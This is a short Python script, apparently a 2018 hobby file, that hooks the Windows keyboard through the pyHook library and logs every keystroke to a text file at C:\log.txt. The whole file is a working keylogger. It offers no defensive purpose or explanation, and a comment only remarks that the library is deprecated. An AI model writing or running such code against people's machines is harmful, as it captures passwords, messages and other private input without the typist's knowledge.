# -*- coding: utf-8 -*-
"""
Created on Mon Aug 20 21:07:28 2018

@author: Carlo
"""

import pyHook, pythoncom, sys, logging   #pyHook is now deprecated. this need to be refreshed using keyboard module
 
file_log="C:\log.txt"
 
def onKeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
 
hooks_manager=pyHook.HookManager()
 
hooks_manager.KeyDown=onKeyboardEvent
 
hooks_manager.HookKeyboard()
 
pythoncom.PumpMessages() 
